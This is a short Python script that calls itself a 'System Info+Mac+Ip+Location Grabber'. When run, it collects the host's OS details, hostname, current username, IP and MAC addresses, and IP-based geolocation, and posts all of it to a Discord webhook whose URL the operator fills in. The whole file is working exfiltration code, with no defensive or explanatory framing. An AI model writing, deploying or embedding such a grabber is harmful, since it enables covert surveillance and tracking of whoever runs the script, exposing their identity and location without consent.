import socket
import platform
import psutil
import ifaddr
import requests
import netifaces
import getpass  # Add this line to import getpass module

def get_system_info():
    system_info = f"System: {platform.system()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"RAM: {psutil.virtual_memory().total} bytes\n"
    system_info += f"Computer Name: {socket.gethostname()}\n"
    system_info += f"User: {getpass.getuser()}\n"  # Include the username
    return system_info

def get_ip_addresses():
    ip_info = "IP Addresses:\n"
    for adapter in ifaddr.get_adapters():
        for ip in adapter.ips:
            ip_info += f"- {ip.ip}\n"
    return ip_info

def get_mac_address():
    mac_info = "MAC Address:\n"
    for interface in netifaces.interfaces():
        try:
            mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
            mac_info += f"- {mac_address}\n"
        except KeyError:
            pass
    return mac_info

def get_device_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        location = f"Location: {data['city']}, {data['region']}, {data['country']}\n"
        return location
    except Exception as e:
        print("Failed to fetch device location:", e)
        return ""

def send_to_discord(webhook_url):
    # Systeminformationen abrufen
    system_info = get_system_info()

    # IP-Adressen abrufen
    ip_info = get_ip_addresses()

    # MAC-Adresse abrufen
    mac_info = get_mac_address()

    # Standort abrufen
    location_info = get_device_location()

    # Inhalt für Discord erstellen
    content = f"<@ADD YOUR DISCORD ID HERE>\n{system_info}\n{ip_info}\n{mac_info}\n{location_info}"
    
    data = {
        "content": content,
        "username": "System Info+Mac+Ip+Location Grabber"
    }

    response = requests.post(webhook_url, json=data)
    print(f"Status Code: {response.status_code}, Response: {response.text}")

# Beispiel für die Verwendung
webhook_url = "ADD YOUR WEBHOOK URL HERE"
send_to_discord(webhook_url)